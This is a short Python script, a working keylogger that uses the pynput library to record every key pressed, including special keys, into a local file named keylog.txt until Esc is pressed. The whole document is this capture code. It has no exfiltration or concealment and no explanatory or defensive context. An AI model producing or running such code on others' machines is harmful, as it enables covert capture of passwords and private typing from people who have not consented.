from pynput import keyboard

# Define the log file where keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        # Write the key pressed to the log file
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys like space, enter, etc.
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when the escape key is pressed
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
